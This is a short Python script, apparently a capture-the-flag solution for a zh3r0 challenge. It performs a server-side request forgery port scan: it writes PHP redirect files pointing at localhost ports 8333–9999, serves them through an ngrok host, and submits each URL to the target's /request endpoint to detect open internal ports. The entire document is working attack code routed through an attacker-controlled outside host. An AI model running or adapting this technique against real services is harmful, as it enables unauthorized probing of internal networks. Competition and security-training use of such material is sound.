import requests
import os

for i in range(8333,10000):
    print(i)
    with open(f"/tmp/{str(i)}.php","w+") as f:
        f.write(f"<?php header('Location: http://localhost:{str(i)}');?>")
    r = requests.post("http://web.zh3r0.cf:6969/request",data={"url":f"http://f8ec29ef19ef.ngrok.io/{str(i)}.php",})
    if "Learn about URL" not in r.text:
        print("port:"+str(i))    
        print(r.text)